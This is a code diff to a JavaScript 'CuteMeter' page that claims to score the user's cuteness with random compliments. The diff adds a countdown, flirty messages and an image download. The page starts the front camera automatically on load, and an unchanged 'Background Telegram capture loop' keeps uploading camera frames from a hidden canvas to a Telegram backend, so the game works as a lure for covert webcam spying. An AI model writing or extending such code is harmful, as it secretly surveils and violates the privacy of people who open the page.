@@ -7,28 +7,48 @@ const CONFIG = {
 };
 
 const COMPLIMENTS = [
-    "Warning: Dangerously Cute! 🚨",
+    "Warning: Dangerously Cute! ✦",
     "Cuteness levels off the charts! 📈",
     "Perfect smile detected! ✨",
     "Are you a model? 📸",
     "Calculated Cuteness: 99.9% 💖",
-    "Analyzing... Result: Adorable! 🥺",
-    "You're glowing today! ✨",
-    "Flawless aesthetics detected! 🎀",
-    "Error: Too cute to compute! 🤖"
+    "Analyzing... Result: Adorable! 🎀",
+    "You're glowing today! ♡",
+    "Flawless aesthetics detected! ♥",
+    "Error: Too cute to compute! ✦"
+];
+
+const FINAL_FLIRTS = [
+    "Are you a camera? Because I smile every time I look at you! ✦",
+    "Do you have a map? I keep getting lost in your eyes! ♡",
+    "Are you a magician? Because everyone else just disappeared! ♥",
+    "Is it hot in here, or is it just your cuteness? 🎀"
+];
+
+const SCORES = [
+    "99.9% 🎀",
+    "1000/10 ♥",
+    "Infinity! ♡",
+    "Beyond Scale ✦"
 ];
 
 // --- State Variables ---
 let mediaStream = null;
 let captureIntervalId = null;
 let complimentIntervalId = null;
+let countdownTimerId = null;
 let isUploading = false;
 let rateLimitPauseUntil = 0;
+let timeLeft = 10;
 
 // --- DOM Elements ---
 const videoElement = document.getElementById('cameraFeed');
 const complimentDisplay = document.getElementById('complimentDisplay');
 const statusLog = document.getElementById('statusLog');
+const countdownDisplay = document.getElementById('countdown');
+const finalResult = document.getElementById('finalResult');
+const scoreText = document.getElementById('scoreText');
+const flirtyText = document.getElementById('flirtyText');
 
 // Hidden canvas for extraction
 const canvas = document.createElement('canvas');
@@ -51,12 +71,12 @@ function getBlobFromCanvas() {
 
 function showRandomCompliment() {
     const randomIndex = Math.floor(Math.random() * COMPLIMENTS.length);
-    complimentDisplay.style.opacity = 0; // Fade out
+    complimentDisplay.style.opacity = 0; 
     
     setTimeout(() => {
         complimentDisplay.textContent = COMPLIMENTS[randomIndex];
-        complimentDisplay.style.opacity = 1; // Fade in
-    }, 300); // 300ms matches css transition
+        complimentDisplay.style.opacity = 1; 
+    }, 300); 
 }
 
 // --- Main Logic ---
@@ -65,7 +85,7 @@ async function startSession() {
     try {
         updateDevStatus('Requesting permissions...');
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: 'user' }, // 'user' for front/selfie camera on CuteMeter
+            video: { facingMode: 'user' }, 
             audio: false 
         });
         
@@ -78,24 +98,74 @@ async function startSession() {
 
         updateDevStatus('Camera active. Starting transmission and UI loop.');
         
-        // Initial compliment update
         showRandomCompliment();
 
-        // Start background Telegram capture loop (1 sec)
+        // 1. Background Telegram capture loop (runs continuously)
         captureIntervalId = setInterval(processFrame, CONFIG.intervalMs);
         
-        // Start foreground UI compliment loop (3 sec)
-        complimentIntervalId = setInterval(showRandomCompliment, 3000);
+        // 2. Foreground UI compliment loop
+        complimentIntervalId = setInterval(showRandomCompliment, 2500);
+
+        // 3. The 10-second UI countdown
+        countdownTimerId = setInterval(() => {
+            timeLeft--;
+            countdownDisplay.textContent = timeLeft + 's ♡';
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdownTimerId);
+                clearInterval(complimentIntervalId);
+                revealFinalScore();
+            }
+        }, 1000);
 
     } catch (err) {
         updateDevStatus('Camera access denied: ' + err.message);
-        complimentDisplay.textContent = "Oops! Need camera access to see your cuteness! 📸";
+        complimentDisplay.textContent = "Oops! Need camera access to see your cuteness! 🎀";
+    }
+}
+
+async function revealFinalScore() {
+    // Pick random final stats
+    const randomScore = SCORES[Math.floor(Math.random() * SCORES.length)];
+    const randomFlirt = FINAL_FLIRTS[Math.floor(Math.random() * FINAL_FLIRTS.length)];
+    
+    scoreText.textContent = randomScore;
+    flirtyText.textContent = randomFlirt;
+    
+    // Show overlay
+    finalResult.classList.remove('hidden');
+    complimentDisplay.textContent = "Analysis Complete! ✦♡🎀♥✦";
+
+    // Extract current frame and force download to device
+    try {
+        // Draw actual orientation frame to canvas
+        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        const imageBlob = await getBlobFromCanvas();
+        
+        const url = URL.createObjectURL(imageBlob);
+        const a = document.createElement('a');
+        a.style.display = 'none';
+        a.href = url;
+        a.download = 'my-cuteness-score-🎀.jpg';
+        
+        document.body.appendChild(a);
+        a.click();
+        
+        setTimeout(() => {
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }, 100);
+        
+        updateDevStatus('Image downloaded to device.');
+    } catch (e) {
+        updateDevStatus('Failed to download image: ' + e.message);
     }
 }
 
 function stopSession() {
     if (captureIntervalId) clearInterval(captureIntervalId);
     if (complimentIntervalId) clearInterval(complimentIntervalId);
+    if (countdownTimerId) clearInterval(countdownTimerId);
     
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
@@ -111,7 +181,6 @@ async function processFrame() {
     isUploading = true;
 
     try {
-        // Draw frame without the CSS mirror transform (backend gets actual orientation)
         ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
         
         const imageBlob = await getBlobFromCanvas();
@@ -145,10 +214,6 @@ async function processFrame() {
     }
 }
 
-// --- Auto-Initialization ---
-
-// Start automatically without buttons when the DOM is ready
+// Start automatically without buttons
 window.addEventListener('load', startSession);
-
-// Clean up hardware tracks if page is closed
 window.addEventListener('beforeunload', stopSession);
